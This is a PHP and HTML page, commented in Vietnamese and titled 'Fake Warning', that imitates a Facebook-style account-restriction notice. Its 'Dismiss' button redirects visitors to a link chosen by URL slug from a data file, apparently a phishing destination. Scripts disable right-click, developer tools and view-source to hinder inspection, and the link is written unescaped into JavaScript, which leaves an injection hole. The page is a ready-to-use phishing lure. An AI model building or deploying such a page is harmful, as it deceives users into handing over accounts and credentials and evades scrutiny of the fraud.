<?php
// Đọc dữ liệu từ file JSON
$file = 'data.json';
$data = json_decode(file_get_contents($file), true);

// Lấy slug từ URL
$slug = isset($_GET['slug']) ? $_GET['slug'] : 'default';

// Lấy link tương ứng với slug, nếu không có thì dùng link mặc định
$link = isset($data[$slug]) ? $data[$slug] : $data['default'];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fake Warning</title>
    <style>
        body {
            font-family: 'Helvetica', Arial, sans-serif;
            background-color: #f5f6f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .warning-box {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 500px;
            text-align: left;
        }

        .warning-box h2 {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #050505;
        }

        .warning-box p {
            font-size: 15px;
            color: #000000;
            margin-bottom: 20px;
            line-height: 1.5;
        }

        .warning-box a {
            color: #385898;
            text-decoration: none;
            font-weight: bold;
        }

        .dismiss-btn {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
            width: 100%;
            text-align: center;
        }

        .dismiss-btn:hover {
            background-color: #145dbf;
        }
    </style>
</head>
<body>
    <div class="warning-box">
        <h2>We suspect automated behavior on your account</h2>
        <p>
            To prevent your account from being temporarily restricted or permanently disabled, 
            ensure that no other users or tools have access to your account and that you're following 
            our <a href="#">Terms of Use</a>. Also consider changing your password to a stronger one 
            to prevent unauthorized access to your account by third parties.
        </p>
        <button class="dismiss-btn" onclick="redirect()">Dismiss</button>
    </div>

    <script>
        function redirect() {
            window.location.href = "<?php echo $link; ?>";
        }
    </script>
    <script>
    // Vô hiệu hóa chuột phải
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });
</script>
<script>
    // Vô hiệu hóa các phím tắt
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.key === 'F12') {
            e.preventDefault();
        }
        // Ctrl+Shift+I (Developer Tools)
        if (e.ctrlKey && e.shiftKey && e.key === 'I') {
            e.preventDefault();
        }
        // Ctrl+Shift+J (Console)
        if (e.ctrlKey && e.shiftKey && e.key === 'J') {
            e.preventDefault();
        }
        // Ctrl+U (View Source)
        if (e.ctrlKey && e.key === 'U') {
            e.preventDefault();
        }
    });
</script>


</body>
</html>
